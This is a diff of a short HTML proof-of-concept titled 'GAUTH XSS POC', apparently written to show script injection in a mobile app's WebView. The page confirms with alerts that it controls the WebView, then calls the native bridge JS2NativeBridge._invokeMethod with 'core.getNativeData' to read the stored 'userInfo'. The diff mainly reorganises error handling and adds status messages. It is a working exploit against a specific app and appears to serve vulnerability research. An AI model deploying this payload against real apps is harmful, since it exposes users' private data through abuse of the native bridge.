@@ -2,20 +2,24 @@
 <html>
   <body>
     <h1>GAUTH XSS POC</h1>
+    <p>If you see this inside the app, JS is running in the WebView.</p>
+
     <script>
       alert("WebView controlled");
 
+      // After 2 seconds, try to call the native JS bridge
       setTimeout(function () {
-        if (window.JS2NativeBridge && JS2NativeBridge._invokeMethod) {
-          try {
+        try {
+          if (window.JS2NativeBridge && JS2NativeBridge._invokeMethod) {
             JS2NativeBridge._invokeMethod(
               '{"func":"core.getNativeData","params":{"key":"userInfo"},"__msg_type":"call","__callback_id":"9999"}'
             );
-          } catch (e) {
-            alert("Bridge call error: " + e);
+            alert("Called JS2NativeBridge._invokeMethod(userInfo)");
+          } else {
+            alert("JS2NativeBridge not available in this WebView");
           }
-        } else {
-          alert("JS2NativeBridge not available");
+        } catch (e) {
+          alert("Bridge call error: " + e);
         }
       }, 2000);
     </script>
